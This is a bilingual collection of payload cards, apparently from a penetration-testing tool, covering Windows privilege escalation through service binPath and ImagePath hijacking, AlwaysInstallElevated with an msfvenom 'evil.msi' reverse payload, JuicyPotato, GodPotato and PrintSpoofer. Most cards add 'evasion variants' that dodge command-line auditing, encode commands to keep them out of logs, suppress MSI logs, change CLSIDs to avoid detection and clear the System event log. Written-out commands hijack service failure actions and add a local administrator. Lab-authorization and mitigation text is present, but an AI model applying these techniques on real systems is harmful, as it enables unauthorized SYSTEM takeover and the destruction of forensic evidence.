description.zh: 停止再启动目标服务触发 binPath 执行；命令以 LocalSystem 上下文运行即完成提权，可把命令换成反弹 shell 实现常驻控制。
description.en: Stop and start the service to fire the rewritten binPath; execution as LocalSystem completes escalation, or swap in a reverse shell to stay on the box.

analysis.zh: Windows 服务 ACL 与路径审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。

An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 只读取一个实验服务的二进制路径、启动账户和 ACL，不修改 binPath 或启停服务。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: 规避变体：注册表直改 ImagePath

description.zh: 规避点：绕过 sc.exe 命令行审计，直接改注册表。判据：服务重启后 s.txt 生成。
description.en: Edits the registry directly to avoid sc.exe command-line auditing. Success: s.txt created after service restart.

title.zh: 规避变体：编码命令规避审计

description.zh: 规避点：base64 参数避免明文命令进入日志。判据：日志中无明文、命令仍执行。
description.en: Base64 keeps plaintext commands out of logs. Success: no plaintext logged yet command runs.

title.zh: 规避变体：服务失败恢复劫持

wafBypass.command:
sc failure {LAB_SERVICE} command= "cmd /c whoami > C:\\Windows\\temp\\f.txt"
sc stop {LAB_SERVICE}

description.zh: 规避点：不改 binPath，改失败恢复命令这一低频审计面。判据：服务崩溃后 f.txt 生成。
description.en: Modifies the rarely audited failure-recovery command instead of binPath. Success: f.txt created after crash.

title.zh: 规避变体：原始路径还原

wafBypass.command:
sc query {LAB_SERVICE} > nul
reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\{LAB_SERVICE} /v ImagePath.orig

description.zh: 规避点：利用预留 .orig 值快速还原，缩短异常窗口。判据：ImagePath 恢复原始值。
description.en: Uses a stashed .orig value to restore quickly. Success: ImagePath back to original.

name.zh: AlwaysInstallElevated 策略审计

description.zh: AlwaysInstallElevated 策略审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: AlwaysInstallElevated Policy Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 AlwaysInstallElevated 策略审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for AlwaysInstallElevated Policy Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 AlwaysInstallElevated 策略审计场景，检验系统是否允许普通用户以 SYSTEM 权限安装 MSI。验证维度含双 Hive 策略查询、MSI 载荷生成与静默安装三步，对应第 1 至第 3 步。
overview.en: This payload covers AlwaysInstallElevated policy auditing, testing whether standard users can install MSI packages with SYSTEM privileges. Validation covers dual-hive policy queries, MSI payload generation and silent installation, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 HKCU 与 HKLM 同时启用 AlwaysInstallElevated：Windows Installer 将以 SYSTEM 执行任意用户提供的 MSI，攻击者构造安装包即获得系统权限。
vulnerability.en: The root cause is AlwaysInstallElevated enabled in both HKCU and HKLM: Windows Installer then runs any user-supplied MSI as SYSTEM, so a crafted package grants system privileges.

exploitation.zh: 第 1 步查询 HKCU 与 HKLM 的 AlwaysInstallElevated 值，两处均为 0x1 即策略生效；第 2 步用 msfvenom 生成以 SYSTEM 回连的 MSI 验证包；第 3 步以 msiexec 静默安装，载荷以 SYSTEM 执行并回连监听即确认提权路径。以 SYSTEM 会话建立为成功判据。占位符在全局变量菜单替换；安装完成后卸载测试包。
exploitation.en: In step 1, query AlwaysInstallElevated under HKCU and HKLM; both reading 0x1 means the policy is live. In step 2, generate a SYSTEM-callback MSI with msfvenom as the verification package. In step 3, install silently with msiexec; the payload executing as SYSTEM and calling back confirms the escalation path. Judge success by a SYSTEM session. Replace placeholders via the global variables menu; uninstall the test package afterwards.

mitigation.zh: 删除两处 Hive 的 AlwaysInstallElevated 策略值并经组策略固化禁用，监控 msiexec 的 SYSTEM 上下文安装。修复后重放第 1 步，查询应返回值不存在且第 3 步安装失败。
mitigation.en: Remove AlwaysInstallElevated from both hives and hard-disable via Group Policy, monitoring SYSTEM-context msiexec installs. After the fix, replay step 1: the value should be absent and step 3 installation should fail.

description.zh: 查询 HKCU 与 HKLM 的 AlwaysInstallElevated 值；两处均为 1 即任意 MSI 将以 SYSTEM 安装，无需管理员密码即成立提权前提。
description.en: Query AlwaysInstallElevated under both HKCU and HKLM; both set to 1 means any MSI installs as SYSTEM with no admin password.

title.zh: 生成恶意 MSI 安装包

description.zh: 用 msfvenom 生成内嵌反向连接载荷的 evil.msi 安装包；本地监听就绪后等待安装触发，以 SYSTEM 权限回连上线。
description.en: Build evil.msi embedding a reverse payload with msfvenom; once installed it calls back to the waiting listener with SYSTEM rights.

description.zh: 用 msiexec 的 quiet 与 qn 参数静默安装第 2 步的 MSI；全程无界面无凭据提示，载荷以 SYSTEM 执行即完成提权上线。
description.en: Install the step-2 MSI with msiexec /quiet /qn; no UI, no credentials, and the payload executes as SYSTEM to finish the escalation.

analysis.zh: AlwaysInstallElevated 策略审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: AlwaysInstallElevated Policy Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 核对 HKCU/HKLM 安装策略和 MSI 日志，不生成或安装带执行逻辑的 MSI。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: 规避变体：WMI 静默安装

description.zh: 规避点：以 WMI 替代 msiexec.exe 进程链，绕过针对 msiexec 的监控。判据：返回 0 且载荷执行。
description.en: WMI replaces the msiexec.exe process chain. Success: ReturnValue 0 and payload runs.

title.zh: 规避变体：本地账户免外联载荷

wafBypass.command:
msfvenom -p windows/x64/exec CMD='net localgroup administrators eva /add' -f msi > evil.msi
msiexec /quiet /qn /i evil.msi

description.zh: 规避点：改用本地加组命令，避免 reverse_tcp 外联触发流量告警。判据：eva 出现在管理员组。
description.en: Local group-add avoids reverse traffic alerts. Success: eva appears in administrators.

title.zh: 规避变体：日志抑制安装

description.zh: 规避点：日志重定向 nul 抑制 msi 详细日志。判据：安装成功且无日志文件生成。
description.en: Redirects MSI logging to nul. Success: install completes with no log file.

title.zh: 规避变体：装后即卸清理

description.zh: 规避点：卸载移除安装记录并删除介质。判据：已安装程序列表与目录均无痕迹。
description.en: Uninstall removes the registration and the media is deleted. Success: no trace in installed programs or disk.

name.zh: JuicyPotato 适用条件审计

description.zh: JuicyPotato 适用条件审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: JuicyPotato Prerequisite Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 JuicyPotato 适用条件审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for JuicyPotato Prerequisite Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 JuicyPotato 适用条件审计场景，检验服务账户特权的 Potato 提权可行性边界。验证维度含 SeImpersonate 特权检查与工具执行两步，对应第 1 至第 2 步。
overview.en: This payload covers JuicyPotato applicability auditing, testing the escalation boundary for service-account privileges with potato tools. Validation covers a SeImpersonate privilege check and tool execution, mapped to steps 1 and 2.

vulnerability.zh: 根因在于服务账户默认持有 SeImpersonatePrivilege 且老版本系统存在可欺骗的 COM 认证接口：满足系统与账户双条件时，potato 工具可直接换取 SYSTEM 令牌。
vulnerability.en: The root cause is service accounts holding SeImpersonatePrivilege by default plus spoofable COM authentication interfaces on older systems: when system version and account conditions align, potato tools trade directly for a SYSTEM token.

exploitation.zh: 第 1 步用 whoami 加 priv 参数检查当前特权，输出包含 SeImpersonatePrivilege 即满足 Potato 前提；第 2 步运行 JuicyPotato 并指定绑定命令与端口，命令以 SYSTEM 执行即确认提权成立，同时记录系统版本以标注适用边界。以 SYSTEM 身份回显为成功判据。占位符在全局变量菜单替换；失败时按系统版本判别应改用的替代工具。
exploitation.en: In step 1, check current privileges with whoami plus the priv flag; output containing SeImpersonatePrivilege meets the potato precondition. In step 2, run JuicyPotato with a bound command and port; the command executing as SYSTEM confirms escalation, and record the OS version to mark applicability. Judge success by SYSTEM-identity output. Replace placeholders via the global variables menu; on failure, pick the appropriate successor tool based on OS version.

mitigation.zh: 升级系统补丁消解 COM 欺骗接口，按需回收服务账户特权并监控命名管道与本地 RPC 异常。修复后重放第 2 步，工具应无法取得 SYSTEM 令牌并触发检测。
mitigation.en: Patch systems to eliminate spoofable COM interfaces, revoke service-account privileges where unneeded, and monitor named-pipe and local RPC anomalies. After the fix, replay step 2: the tool should fail to obtain SYSTEM with detections firing.

description.zh: 用 whoami /priv 过滤 SeImpersonatePrivilege；服务账号或应用池身份常见持有该特权即满足 Potato 系列提权的核心前提。
description.en: Filter whoami /priv for SeImpersonatePrivilege; service or app-pool accounts commonly hold it, satisfying the core prerequisite for the Potato family.

title.zh: 准备 COM 伪造环境

description.zh: 依据系统版本挑选可用的 COM CLSID 与本地监听端口，上传 JuicyPotato 并确认目标可回连；参数就绪后即具备触发提权的完整条件。
description.en: Pick a working COM CLSID for the OS version, stage JuicyPotato with a local port and confirm egress; with parameters set, the escalation is ready to fire.

description.zh: 指定监听端口与命令运行 JuicyPotato，伪造 COM 提权接口诱骗 SYSTEM 前来模拟；绑定命令以 SYSTEM 执行即提权成功。
description.en: Run JuicyPotato with a port and command, faking a COM elevation endpoint to bait SYSTEM into impersonation; the bound command running as SYSTEM seals it.

analysis.zh: JuicyPotato 适用条件审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: JuicyPotato Prerequisite Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 核对实验系统版本、COM 服务和 SeImpersonate 权限，不启动 SYSTEM 命令。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: 规避变体：换 CLSID 规避监控

description.zh: 规避点：换 BITS CLSID 与非默认端口，绕过针对 PrintNotify 默认 CLSID:1337 的检测。判据：输出 SYSTEM。
description.en: Switches to the BITS CLSID and a non-default port. Success: SYSTEM output.

description.zh: 规避点：不同实现规避 JuicyPotato 哈希特征。判据：j.txt 为 SYSTEM。
description.en: Different implementation evades JuicyPotato hashes. Success: j.txt shows SYSTEM.

title.zh: 规避变体：GodPotato 新系统适配

description.zh: 规避点：Server2019+/Win10/11 走 EfsRpc 路径不再依赖 SeImpersonate 端口监听。判据：g.txt 为 SYSTEM。
description.en: EfsRpc path for newer systems with no listening port required. Success: g.txt shows SYSTEM.

description.zh: 规避点：清除输出文件与系统日志。判据：temp 无残留、System 日志清空。
description.en: Removes outputs and clears the system log. Success: no temp leftovers, System log empty.

name.zh: PrintSpoofer 适用条件审计

description.zh: PrintSpoofer 适用条件审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: PrintSpoofer Prerequisite Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 PrintSpoofer 适用条件审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for PrintSpoofer Prerequisite Audit are authorized in writing and reversible.

prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 PrintSpoofer 适用条件审计场景，检验打印后台处理服务接口的模拟提权可达性。验证维度含交互 Shell 获取与指定命令执行两种模式，对应第 1 至第 2 步。
overview.en: This payload covers PrintSpoofer applicability auditing, testing reachability of impersonation escalation through the print-spooler service interface. Validation covers interactive-shell and fixed-command modes, mapped to steps 1 and 2.

vulnerability.zh: 根因在于打印后台处理服务以 SYSTEM 运行且其命名管道逻辑可被诱导连接：持有 SeImpersonate 的账户借管道模拟取得后台服务令牌，绕过旧版 potato 的端口限制。
vulnerability.en: The root cause is the print spooler running as SYSTEM with inducible named-pipe logic: an account holding SeImpersonate impersonates the spooler token through the pipe, sidestepping older potato port limitations.

exploitation.zh: 第 1 步以交互模式运行 PrintSpoofer 获取 Shell，whoami 显示 SYSTEM 即确认提权；第 2 步以 -c 指定命令写输出文件，文件内容为 SYSTEM 身份结果即验证非交互路径。两种模式均需先确认 SeImpersonate 与后台服务运行状态。以 SYSTEM 上下文产出为成功判据。占位符在全局变量菜单替换；测试后停止后台服务异常状态。
exploitation.en: In step 1, run PrintSpoofer in interactive mode to get a shell; whoami showing SYSTEM confirms escalation. In step 2, run with -c executing a fixed command into an output file; SYSTEM-identity content verifies the non-interactive path. Both modes require confirming SeImpersonate and spooler status first. Judge success by SYSTEM-context output. Replace placeholders via the global variables menu; restore spooler state after testing.

mitigation.zh: 在无需打印能力的服务器禁用 Print Spooler 服务，限制服务账户特权并监控后台处理服务的异常管道连接。修复后重放第 1、2 步，工具应报错退出且无 SYSTEM 进程生成。
mitigation.en: Disable the Print Spooler where printing is unneeded, constrain service-account privileges, and monitor anomalous pipe connections to the spooler. After the fix, replay steps 1 and 2: the tool should error out with no SYSTEM process spawned.

title.zh: 确认模拟特权运行环境

description.zh: 确认当前进程以服务账号或应用池身份运行且持有模拟特权，上传 PrintSpoofer 并验证打印服务存活；满足前提后进入提权触发阶段。
description.en: Verify the process runs as a service or app-pool account with impersonation rights, stage PrintSpoofer and check the spooler is alive before firing.

description.zh: 运行 PrintSpoofer 的交互模式伪装打印服务命名管道；打印组件以 SYSTEM 回连时被反向模拟，返回的 shell 即本机最高权限。
description.en: Run PrintSpoofer interactively to fake a print-service pipe; when the SYSTEM spooler connects it gets impersonated in reverse, returning a top-privilege shell.

title.zh: 无交互执行 SYSTEM 命令

description.zh: 用 -c 参数指定 whoami 并输出到文件；文件内容显示 nt authority system 即确认可在脚本中批量执行 SYSTEM 级命令。
description.en: Use -c to run whoami redirected to a file; nt authority\system inside proves SYSTEM commands can be scripted at scale.

analysis.zh: PrintSpoofer 适用条件审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。

An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.
